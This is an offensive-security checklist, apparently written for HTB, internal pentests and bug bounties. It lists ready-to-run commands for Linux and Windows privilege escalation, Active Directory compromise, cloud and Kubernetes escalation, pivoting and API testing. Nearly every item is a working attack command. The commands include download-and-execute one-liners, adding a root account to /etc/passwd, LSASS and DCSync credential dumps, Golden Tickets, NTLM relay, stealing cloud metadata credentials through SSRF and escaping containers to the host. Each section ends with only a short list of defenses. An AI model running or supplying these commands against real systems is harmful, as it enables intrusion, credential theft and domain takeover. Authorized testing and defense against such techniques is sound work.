# Checklists: infrastructure / post-exploitation (batch 3, 2025-2026)

> For HTB/internal/bug-bounty: privesc, Active Directory, cloud, pivoting, API. Items with inline `code` are copied with a click.

---

## 1. Linux Privilege Escalation

**Quick auto-enum**
- [ ] Drop and run LinPEAS with full coverage: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` or locally `./linpeas.sh -a 2>&1 | tee linpeas.out` (the `-a` flag = all checks)
- [ ] Basic context: `id; sudo -l; uname -a; cat /etc/os-release; hostname; ip a` - user, groups, kernel version, distribution
- [ ] Dynamics without root: `./pspy64` (catches cron/timers and creds in process argv), additionally `./lse.sh -l1`

**SUID/SGID and capabilities**
- [ ] SUID: `find / -perm -4000 -type f 2>/dev/null`; SGID: `find / -perm -2000 -type f 2>/dev/null` - every non-standard binary via GTFOBins (SUID section); classics: `find`, `nmap --interactive`, `vim`, `bash -p`, `env`, `cp`/`tee` on `/etc/passwd`
- [ ] Capabilities: `getcap -r / 2>/dev/null` - look for `cap_setuid+ep` (`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`), `cap_dac_read_search`, `cap_sys_admin`

**sudo vector**
- [ ] Review `sudo -l`: each allowed command via GTFOBins (Sudo section); `(ALL) NOPASSWD` on `vim`/`less`/`awk`/`find`/`tar` = instant root
- [ ] `env_keep`/`LD_PRELOAD`: if `sudo -l` has `env_keep+=LD_PRELOAD`, build a `.so` with `_init()` -> `sudo LD_PRELOAD=/tmp/x.so <command>`
- [ ] Version: `sudo --version` -> Baron Samedit (CVE-2021-3156, sudo < 1.9.5p2), sudoedit (CVE-2023-22809, injection via `EDITOR=vim -- /etc/sudoers`)

**Cron, timers, PATH**
- [ ] Cron: `cat /etc/crontab; ls -la /etc/cron.*; crontab -l` - writable scripts (`find / -writable -name '*.sh' 2>/dev/null`), wildcard injections (`tar`/`rsync`), relative PATH
- [ ] systemd timers: `systemctl list-timers --all`; permissions on units: `find /etc/systemd/ -writable 2>/dev/null`

**Writable targets**
- [ ] Writable `/etc/passwd`: `echo 'pwn:$(openssl passwd -1 -salt x pass):0:0::/root:/bin/bash' >> /etc/passwd` then `su pwn`; check `/etc/shadow`, `/etc/sudoers.d/`
- [ ] Writable PATH/service binary: `echo $PATH` (is there a `.`/writable directory before the system one?); `find / -perm -o+w -type f 2>/dev/null`

**Kernel, containers, NFS**
- [ ] Kernel -> exploit: `uname -r` -> `searchsploit linux kernel <version>`; current: DirtyPipe (CVE-2022-0847, 5.8-5.16.11), PwnKit/pkexec (CVE-2021-4034, almost universal), GameOver(lay) Ubuntu (CVE-2023-2640/32629)
- [ ] Groups from `id`: `docker` (`docker run -v /:/mnt -it alpine chroot /mnt sh`), `lxd`/`lxc` (privileged alpine), `disk` (debugfs to `/dev/sda`)
- [ ] NFS `no_root_squash`: on the target `cat /etc/exports`; from the attacker `mount -t nfs target:/share /mnt` -> SUID `bash` as root -> on the target `/share/bash -p`

**Reverse via artifacts**
- [ ] Creds/keys: `cat ~/.bash_history /root/.bash_history 2>/dev/null`; `grep -rinE 'password|passwd|secret|api[_-]?key' /var/www /opt /home 2>/dev/null`; `find / -name id_rsa -o -name authorized_keys 2>/dev/null`; password reuse for `su root`

**Tools:** `linpeas.sh`, `pspy64`, `lse.sh`, `GTFOBins`, `searchsploit`, `linux-exploit-suggester.sh`
**Defense (for the report):** minimize SUID/capabilities, patch the kernel and sudo, sudoers without `NOPASSWD`/`env_keep`, `root_squash` on NFS, audit cron/permissions (`auditd`, least privilege).

---

## 2. Windows Privilege Escalation

**Quick auto-enum**
- [ ] WinPEAS: `winPEASx64.exe` (or `winPEASany.exe`); without a binary: `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended"`
- [ ] Context and privileges: `whoami /all` (key one - `whoami /priv`), `systeminfo`, `net localgroup administrators`

**Token privileges (Potato/SeBackup/SeDebug)**
- [ ] `SeImpersonatePrivilege`/`SeAssignPrimaryToken` (service/IIS/MSSQL) -> `PrintSpoofer64.exe -i -c cmd`, `GodPotato -cmd "cmd /c whoami"` (universal for .NET, 2019/2022/10/11), `JuicyPotatoNG.exe`
- [ ] `SeBackupPrivilege`/`SeRestorePrivilege` -> dump hives: `reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive` -> offline `secretsdump.py -sam sam.hive -system system.hive LOCAL`
- [ ] `SeDebugPrivilege` -> dump LSASS `procdump.exe -accepteula -ma lsass.exe lsass.dmp` (or `mimikatz sekurlsa::minidump`)

**Services**
- [ ] Unquoted service path: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"` - a path with a space without quotes -> drop in `C:\Program.exe`; restart `sc start <svc>`
- [ ] Weak permissions: `accesschk.exe -uwcqv "Everyone" *` / `accesschk64.exe -wuvc <service>` - `SERVICE_CHANGE_CONFIG` -> `sc config <svc> binPath= "C:\tmp\rev.exe"`

**Registry and installers**
- [ ] AlwaysInstallElevated: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` and `HKCU` - if both `=1`: `msiexec /quiet /qn /i evil.msi` (`msfvenom -p windows/x64/exec ... -f msi`)
- [ ] Autoruns: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`; permissions on keys/services (`accesschk`/`PowerUp`)

**Saved creds**
- [ ] `cmdkey /list` -> `runas /savecred /user:admin cmd`; search `findstr /si password *.txt *.xml *.config`, `Unattend.xml`/`web.config`, GPP `Groups.xml` (cpassword)
- [ ] DPAPI/managers: `mimikatz dpapi::cred`, `vaultcmd /listcreds:"Windows Credentials" /all`

**Auto-checks and kernel**
- [ ] PowerUp: `powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"` (unquoted paths, service ACLs, AlwaysInstallElevated, DLL hijack)
- [ ] Missing patches: `systeminfo > si.txt` -> `wes.py si.txt` (wesng) or `Watson.exe`; PrintNightmare (CVE-2021-34527), HiveNightmare/SeriousSAM (CVE-2021-36934, `icacls C:\Windows\System32\config\SAM`)
- [ ] UAC bypass (in the admin group, Medium IL): `fodhelper.exe`/`computerdefaults` via `HKCU\Software\Classes\...\shell\open\command`, or UACME `Akagi64.exe`

**Tools:** `winPEASx64.exe`, `PrivescCheck.ps1`, `PowerUp.ps1`/`SharpUp`, `accesschk.exe`, `PrintSpoofer`, `GodPotato`, `JuicyPotatoNG`, `mimikatz`, `procdump`, `secretsdump.py`, `wesng`, `Watson`
**Defense (for the report):** quote service paths, fix ACLs, disable `AlwaysInstallElevated`, LAPS on local admins, remove excess token privileges from services, patch management, Credential Guard + UAC at maximum.

---

## 3. Active Directory - attack chain

**Enumeration without creds (anon/null/guest)**
- [ ] SMB fingerprint, domain, OS, signing: `nxc smb <ip>` and across the subnet `nxc smb <cidr>`
- [ ] Null/guest - shares and password policy: `nxc smb <ip> -u '' -p '' --shares --pass-pol`; guest: `nxc smb <ip> -u 'guest' -p '' --shares`
- [ ] Deep null analysis: `enum4linux-ng -A <ip>`
- [ ] RID brute (user list without creds): `nxc smb <ip> -u '' -p '' --rid-brute 10000` (if null is closed - `-u 'guest' -p ''`)
- [ ] Anonymous LDAP: `ldapsearch -x -H ldap://<dc> -s base namingContexts`; dump: `ldapsearch -x -H ldap://<dc> -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName`
- [ ] Kerberos user enum (without a password): `kerbrute userenum -d corp.local --dc <dc> users.txt`
- [ ] AS-REP roast without authentication: `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip <dc> -format hashcat`

**With any user's creds**
- [ ] Validation (Pwn3d! = local admin): `nxc smb <dc> -u u -p 'p'`; LDAP signing/channel-binding is printed right in the banner: `nxc ldap <dc> -u u -p 'p'`
- [ ] BloodHound graph: `bloodhound-python -d corp.local -u u -p 'p' -ns <dc> -c All --zip` (or `nxc ldap <dc> -u u -p 'p' --bloodhound --collection All --dns-server <dc>`)
- [ ] Descriptions/SPN: `nxc ldap <dc> -u u -p 'p' -M get-desc-users`; SPN: `nxc ldap <dc> -u u -p 'p' --kerberoasting kerb.txt`
- [ ] SYSVOL/shares for passwords (GPP cpassword): `nxc smb <dc> -u u -p 'p' -M gpp_password -M gpp_autologin`

**Kerberos: AS-REP and Kerberoast**
- [ ] AS-REP roast (authenticated): `impacket-GetNPUsers corp.local/u:'p' -dc-ip <dc> -request -format hashcat -outputfile asrep.txt`
- [ ] Kerberoast: `impacket-GetUserSPNs corp.local/u:'p' -dc-ip <dc> -request -outputfile kerb.txt`; from Windows: `Rubeus.exe kerberoast /outfile:kerb.txt /nowrap`
- [ ] Targeted (writeSPN): `targetedKerberoast.py -d corp.local -u u -p 'p' --dc-ip <dc>`
- [ ] Crack: AS-REP `hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`; TGS-REP RC4 `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule` (AES -> `-m 19600/19700`)

**Password spraying (lockout-aware)**
- [ ] First the policy: `nxc smb <dc> -u u -p 'p' --pass-pol` (learn the threshold/window!)
- [ ] Spray with a single password: `nxc smb <dc> -u users.txt -p 'Corp2025!' --continue-on-success --no-bruteforce` (1 password/round, wait for the window reset)
- [ ] Candidates: `Winter2025!`, `Spring2026!`, `<Company>1!`, `Welcome1`; user=pass: `nxc smb <dc> -u users.txt -p users.txt --no-bruteforce`

**ACL / BloodHound paths**
- [ ] ForceChangePassword: `net rpc password 'victim' 'NewP@ss123!' -U 'corp.local/u%p' -S <dc>` (or `bloodyAD --host <dc> -d corp.local -u u -p 'p' set password victim 'NewP@ss123!'`)
- [ ] GenericAll/GenericWrite over a user -> targeted Kerberoast/shadow creds; over a computer -> RBCD
- [ ] WriteDACL/owns the root -> DCSync to yourself: `dacledit.py -action write -rights DCSync -principal u -target-dn 'DC=corp,DC=local' corp.local/u:'p'`
- [ ] AddMember to a group: `bloodyAD --host <dc> -d corp.local -u u -p 'p' add groupMember 'Target Group' u`

**Delegation**
- [ ] Unconstrained: `nxc ldap <dc> -u u -p 'p' --trusted-for-delegation` -> on the host `Rubeus.exe monitor /interval:5 /nowrap` + coerce DC -> TGT DC$
- [ ] Constrained (S4U): `impacket-getST -spn cifs/target.corp.local -impersonate administrator -dc-ip <dc> 'corp.local/svc:p'`
- [ ] RBCD: `impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss123!' corp.local/u:'p'` -> `impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write corp.local/u:'p'` -> `impacket-getST -spn cifs/target.corp.local -impersonate administrator 'corp.local/EVIL$:P@ss123!'`
- [ ] Use the ticket: `export KRB5CCNAME=administrator.ccache; impacket-wmiexec -k -no-pass corp.local/administrator@target.corp.local`

**ADCS (Certipy)**
- [ ] Find vulnerable templates/CA: `certipy-ad find -u u@corp.local -p 'p' -dc-ip <dc> -vulnerable -stdout` (ESC1-ESC16)
- [ ] ESC1 (arbitrary SAN): `certipy-ad req -u u@corp.local -p 'p' -dc-ip <dc> -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@corp.local` -> `certipy-ad auth -pfx administrator.pfx -dc-ip <dc>`
- [ ] ESC8 (Web Enroll + relay): `certipy-ad relay -target 'http://<ca>/certsrv/' -template DomainController` + coerce DC -> pfx DC$ -> DCSync
- [ ] ESC4 (write on a template): `certipy-ad template -u u@corp.local -p 'p' -template 'VulnTemplate' -dc-ip <dc> -write-default-configuration` then ESC1

**Coercion + relay**
- [ ] Coercion: `coercer coerce -u u -p 'p' -d corp.local -t <dc> -l <attacker_ip>` or `petitpotam.py -u u -p 'p' -d corp.local <attacker_ip> <dc>` (also `printerbug.py`)
- [ ] Relay to LDAPS (no signing): `impacket-ntlmrelayx -t ldaps://<dc> --escalate-user u` or `--delegate-access` (RBCD)
- [ ] Relay to ADCS (ESC8): `impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController`
- [ ] Relay to SMB (signing off): first `nxc smb <cidr> --gen-relay-list relay.txt`, then `impacket-ntlmrelayx -tf relay.txt -smb2support`

**Secrets dump**
- [ ] DCSync: `impacket-secretsdump -just-dc corp.local/administrator@<dc> -hashes :<nthash>` (or `-just-dc-user krbtgt`)
- [ ] Via nxc: `nxc smb <dc> -u administrator -H <nthash> --ntds`
- [ ] Locally (with admin rights): `nxc smb <host> -u admin -p 'p' --sam --lsa -M lsassy`; gMSA/LAPS: `nxc ldap <dc> -u u -p 'p' --gmsa` / `-M laps`

**Persistence**
- [ ] Golden Ticket: `impacket-ticketer -nthash <krbtgt_nt> -domain-sid <SID> -domain corp.local administrator`
- [ ] Silver Ticket (without DC): `impacket-ticketer -nthash <svc_nt> -domain-sid <SID> -domain corp.local -spn cifs/target.corp.local administrator`
- [ ] Shadow creds: `certipy-ad shadow auto -u u@corp.local -p 'p' -account 'victim' -dc-ip <dc>`

**Lateral movement**
- [ ] Pass-the-Hash across the subnet: `nxc smb <cidr> -u administrator -H <nthash>` (local - `--local-auth`)
- [ ] Shell: `evil-winrm -i <host> -u administrator -H <nthash>` / `impacket-psexec` (SYSTEM, noisy) / `impacket-wmiexec` (quieter)
- [ ] Overpass-the-Hash: `impacket-getTGT corp.local/administrator -hashes :<nt>` -> `export KRB5CCNAME=administrator.ccache` -> `impacket-wmiexec -k -no-pass corp.local/administrator@<host>`

**Tools:** `nxc` (netexec), `impacket`, `certipy-ad`, `bloodhound-python`/SharpHound, `kerbrute`, `Rubeus`, `bloodyAD`, `dacledit`/`targetedKerberoast`, `coercer`/`petitpotam`, `enum4linux-ng`, `evil-winrm`, `hashcat`
**Defense (for the report):** LDAP signing + channel binding and SMB signing, disable null/anonymous and RC4/preauth-less, remove vulnerable ADCS templates (ESC1/8), tiering + gMSA/LAPS, monitor DCSync/AS-REP/coercion, double krbtgt rotation.

---

## 4. Cloud - AWS / Azure / GCP / Kubernetes

**Identification (found keys/token)**
- [ ] AWS - whose creds are these: `aws sts get-caller-identity`
- [ ] AWS - profile: `aws configure --profile loot` (or `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`)
- [ ] Azure: `az login` then `az account show` and `az account list -o table`
- [ ] GCP: `gcloud auth activate-service-account --key-file=key.json` then `gcloud auth list`

**Enumeration and rights audit**
- [ ] AWS misconfig audit: `scout suite aws` (HTML report) and/or `prowler aws -p loot`
- [ ] AWS interactive: `python3 pacu.py` -> `import_keys loot` -> `run iam__enum_permissions` -> `run iam__privesc_scan`
- [ ] AWS your own actions/policies: `aws iam list-attached-user-policies --user-name <me>`, `enumerate-iam`
- [ ] Azure AAD recon: `roadrecon auth -u user@tenant -p pass` -> `roadrecon gather` -> `roadrecon gui`
- [ ] GCP: `gcloud projects list`, `gcloud projects get-iam-policy <proj>`

**S3 / Storage and secrets**
- [ ] AWS buckets: `aws s3 ls` -> `aws s3 ls s3://<bucket> --recursive` -> `aws s3 sync s3://<bucket> ./loot`
- [ ] Public without creds: `aws s3 ls s3://<bucket> --no-sign-request`, `curl https://<bucket>.s3.amazonaws.com/`
- [ ] Secrets in the dump: `trufflehog s3 --bucket=<bucket>` or `trufflehog filesystem ./loot`

**IAM privilege escalation**
- [ ] iam:PassRole + service: `aws lambda create-function --role <admin-role> ...` / `aws ec2 run-instances --iam-instance-profile ...`
- [ ] iam:CreatePolicyVersion: `aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default`
- [ ] sts:AssumeRole (including cross-account): `aws sts assume-role --role-arn <arn> --role-session-name x`
- [ ] iam:CreateAccessKey/UpdateLoginProfile (persistence): `aws iam create-access-key --user-name <victim>`

**SSRF -> Instance Metadata -> role**
- [ ] AWS IMDSv1: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` -> `curl .../<role>`
- [ ] AWS IMDSv2: `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")` -> `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- [ ] Azure managed identity: `curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"`
- [ ] GCP: `curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`

**Kubernetes - from a pod**
- [ ] Service account token/CA: `cat /var/run/secrets/kubernetes.io/serviceaccount/token` (+ `ca.crt`, `namespace`)
- [ ] What the token allows: `kubectl auth can-i --list` (target: `create pods`, `list secrets`, `*`)
- [ ] Auto-enum: `peirates` (interactive), `kube-hunter --pod`
- [ ] Secrets: `kubectl get secrets -A -o yaml`

**Kubernetes - escape to the node**
- [ ] Privileged pod with hostPath `/`: `kubectl run pwn --image=alpine --privileged --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}],"command":["sleep","999999"]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'` -> `kubectl exec -it pwn -- chroot /host bash`
- [ ] Mounted docker.sock: `docker -H unix:///var/run/docker.sock run -it --privileged --pid=host -v /:/host alpine chroot /host`
- [ ] Privileged container: `fdisk -l` -> `mount /dev/sda1 /mnt && chroot /mnt`

**Tools:** `awscli`/`az`/`gcloud`/`kubectl`, ScoutSuite, Prowler, Pacu, CloudFox, ROADtools (`roadrecon`), trufflehog, peirates, kube-hunter, `enumerate-iam`
**Defense (for the report):** IMDSv2 (hop-limit=1) + cut egress to 169.254.169.254; least-privilege IAM/RBAC (forbid iam:PassRole/CreatePolicyVersion/AssumeRole on broad roles); block public S3, encryption, CloudTrail/GuardDuty; k8s - PodSecurity restricted, no privileged/hostPath, `automountServiceAccountToken: false`.

---

## 5. Pivoting and tunneling

**Recon of internal networks**
- [ ] Interfaces/routes/neighbors: `ip a` / `ip route` (Win: `ipconfig /all`, `route print`), `arp -a`, `cat /etc/hosts`, `cat /etc/resolv.conf`
- [ ] Live hosts/ports without tools: `for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i >/dev/null && echo 10.10.10.$i up) & done`; port via bash: `(echo >/dev/tcp/10.10.10.5/445) 2>/dev/null && echo open`

**Ligolo-ng (the main method, TUN)**
- [ ] On the attacker: `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up` then `./proxy -selfcert`
- [ ] On the target (reverse): `./agent -connect <attacker_ip>:11601 -ignore-cert`
- [ ] In the console: `session` -> select the agent -> `start`; route on the attacker: `sudo ip route add 10.10.20.0/24 dev ligolo`
- [ ] Reverse forward (listener on the agent -> to us): `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`

**Chisel (HTTP tunnel / no TUN)**
- [ ] Attacker - reverse server: `chisel server -p 8080 --reverse`
- [ ] Target - reverse SOCKS: `chisel client <attacker_ip>:8080 R:socks` (then `socks5 127.0.0.1 1080` in proxychains)
- [ ] Port forward: `chisel client <attacker_ip>:8080 R:3389:10.10.20.5:3389`

**SSH tunnels and proxychains**
- [ ] Dynamic SOCKS: `ssh -D 1080 -fN user@<pivot>` + in `/etc/proxychains.conf`: `socks5 127.0.0.1 1080` -> `proxychains nmap -sT -Pn 10.10.20.5`
- [ ] Local forward: `ssh -L 8000:10.10.20.5:80 user@<pivot>` (-> `http://127.0.0.1:8000`)
- [ ] Reverse forward: `ssh -R 9001:127.0.0.1:9001 user@<pivot>`
- [ ] VPN-like: `sshuttle -r user@<pivot> 10.10.20.0/24`

**Metasploit / Meterpreter**
- [ ] Route through the session: `run autoroute -s 10.10.20.0/24` (or `route add 10.10.20.0/24 <session_id>`)
- [ ] SOCKS over the routes: `use auxiliary/server/socks_proxy` -> `set SRVPORT 1080` -> `run`
- [ ] Port forward: `portfwd add -l 3389 -p 3389 -r 10.10.20.5`

**Socat / double pivot**
- [ ] TCP relay: `socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80`
- [ ] Double pivot: a chain of ligolo agents or nested SOCKS in proxychains (`dynamic_chain`, proxies line by line)

**Tools:** ligolo-ng, chisel, OpenSSH (`-L`/`-R`/`-D`), proxychains-ng, sshuttle, socat, Metasploit (`autoroute`/`socks_proxy`/`portfwd`), nmap (`-sT -Pn` through a proxy)
**Defense (for the report):** segmentation and ACLs between zones, egress filtering, monitor TUN/long reverse sessions/anomalous SOCKS (Zeek/Suricata/EDR), `AllowTcpForwarding no` on SSH.

---

## 6. API Testing (OWASP API Top 10)

**Discovery / spec and surface**
- [ ] Find the spec: `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs`, `/swagger-ui.html`, `/.well-known/openapi.json`
- [ ] GraphQL introspection: `{"query":"query{__schema{types{name fields{name}}}}"}` on `/graphql`, `/api/graphql`, `/query` -> dump the schema
- [ ] Import the spec into Burp (Import OpenAPI)/Postman; hidden parameters `arjun -u https://target/api/v1/user -m GET,POST`; routes `kr scan https://target -w routes.kite`
- [ ] Versions/methods: `/api/v1/..` vs `/api/v2/..` (auth drift), `OPTIONS`, override `X-HTTP-Method-Override: PUT`

**API1 BOLA / IDOR (priority $$$)**
- [ ] 2 accounts (A,B): B's object with A's token - `GET /api/v1/orders/{id_B}`, `GET /api/users/me?id=victim`
- [ ] Brute id: `ffuf -u https://target/api/v1/orders/FUZZ -w ids.txt -H "Authorization: Bearer A"`; collect UUIDs from other responses, do not guess
- [ ] Nested/adjacent: `/users/{id}/cards`, `/accounts/{id}/transactions`, GraphQL field by field

**API2 Broken Authentication**
- [ ] Remove the token / expired / someone else's JWT / empty `Bearer` - where access still exists
- [ ] JWT attacks (see the JWT checklist): `alg:none`, RS256->HS256, weak secret `hashcat -m 16500 jwt.txt rockyou.txt`, `kid` traversal/SQLi
- [ ] Logic: brute OTP/`reset-token`, code reuse, no old password on change

**API3 Mass Assignment / excessive data**
- [ ] Privileged fields in JSON: `"role":"admin"`, `"isAdmin":true`, `"is_staff":true`, `"verified":true`, `"balance":999999`, `"user_id":<victim>`
- [ ] Excessive data exposure: compare the raw JSON with what the UI renders - `password_hash`, `ssn`, tokens, PII in "extra" fields

**API5 BFLA (priority $$$)**
- [ ] An admin function as a regular user: `POST /api/v1/admin/users`, `DELETE /api/v1/users/{id}`, `/internal/*`, `/actuator/*`
- [ ] Switch the method to a privileged one: `GET`->`PUT`/`PATCH`/`DELETE`; admin routes via `v1` if `v2` is closed

**API4 / API6 / API7**
- [ ] Rate-limit/resources: 100+ requests (Intruder/`ffuf`) -> `429`?; GraphQL batching and deep nesting (DoS)
- [ ] Business flow: automate a scarce operation without anti-automation
- [ ] SSRF in URL fields (`url`,`callback`,`webhook`,`avatar`,`image_url`): `http://169.254.169.254/latest/meta-data/`, `http://localhost:<port>/`, Collaborator domain; blind via DNS/HTTP

**Tools:** Burp (Repeater/Intruder/Import OpenAPI/Collaborator), `ffuf`, `arjun`, `kiterunner` (`kr`), Postman, `graphql-cop`, `clairvoyance`, `jwt_tool`, `grpcurl` (`grpcurl -plaintext target:port list`)
**Defense (for the report):** server-side authorization by object and function on EVERY request (deny-by-default), DTO field allowlist (forbid mass assignment), unified rate-limit/quotas, outgoing URL allowlist against SSRF.

---

## 7. Recon pipeline (enumeration automation)

**Scope and preparation**
- [ ] Fix the scope (in-scope domains/CIDR, wildcard, exclusions) in `roots.txt`; keep out-of-scope handy
- [ ] Keys for passive sources (`~/.config/subfinder/provider-config.yaml`, `CHAOS_KEY`, amass datasources) - without them coverage drops sharply

**Passive subdomain collection**
- [ ] `subfinder -d target.com -all -recursive -silent -o subs_sf.txt`
- [ ] `amass enum -passive -d target.com -o subs_amass.txt`
- [ ] crt.sh: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u`
- [ ] Merge/dedup: `cat subs_*.txt | sort -u > subs_all.txt` (+ permutations `alterx`)

**Resolve and live**
- [ ] Resolve: `dnsx -l subs_all.txt -silent -a -resp -o resolved.txt`
- [ ] Live web: `httpx -l resolved.txt -title -tech-detect -status-code -ip -silent -o live.txt`

**Ports**
- [ ] Fast: `naabu -list resolved.txt -top-ports 1000 -silent -o ports.txt`
- [ ] In depth: `nmap -sCV -Pn -iL <(cut -d: -f1 ports.txt | sort -u) -oA nmap_out`

**Crawling, JS, history**
- [ ] Crawling (JS): `katana -list live.txt -jc -kf all -d 3 -silent -o urls_katana.txt`
- [ ] History: `gau --threads 5 < live.txt > urls_gau.txt`; `cat live.txt | waybackurls > urls_wb.txt`
- [ ] JS and secrets: `getJS --input live.txt --complete | httpx -silent -mc 200 | nuclei -t http/exposures/ -silent`; grep `api_key`/`token`/`s3` in JS

**Screenshots and nuclei**
- [ ] Triage: `gowitness scan file -f live.txt --screenshot-path ./shots`
- [ ] Templates: `nuclei -l live.txt -severity critical,high,medium -es info -rl 150 -o nuclei.txt`; takeover `nuclei -l live.txt -t http/takeovers/`

**Pipeline and monitoring**
- [ ] Full pipe: `subfinder -d target.com -all -silent | dnsx -silent | httpx -silent | nuclei -severity critical,high -silent`
- [ ] Monitor new assets: cron + `anew` (diff) + `notify` (Slack/Discord/Telegram on a delta)

**Tools:** ProjectDiscovery (`subfinder`/`dnsx`/`naabu`/`httpx`/`katana`/`nuclei`/`chaos`/`alterx`/`notify`), `amass`, `gau`, `waybackurls`, `getJS`, `gowitness`, `nmap`, `jq`, `anew`
**Defense (for the report):** minimize the external surface (close unneeded services, dangling DNS), do not expose secrets in JS/history, monitor your own assets and run periodic external scans.
